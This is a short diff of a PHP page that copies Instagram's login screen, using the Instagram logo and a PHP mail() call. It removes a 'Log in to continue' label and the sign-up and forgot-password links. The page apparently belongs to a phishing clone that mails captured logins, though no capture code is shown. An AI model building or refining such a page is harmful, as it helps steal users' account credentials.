@@ -7,7 +7,6 @@
   </head>
   <body>
     <div class="container">
-      <div class="text">Log in to continue</div>
       <div class="page">
         <img class="logo" src="img/instagram_cursive.png"/>
 
@@ -91,10 +90,6 @@ mail($to, $subject, $message, $headers);
 ?>
 
 	</div>
-        <div class="signup">
-            <p>Don't have an account?<a href="./register.php" data-test="signUp">Sign up</a></p>
-	    <p><a href="./forgot.php" data-test="forgotPassword">Forgot password?</a></p>        
-</div>
       </div>
     </div>
   </body>
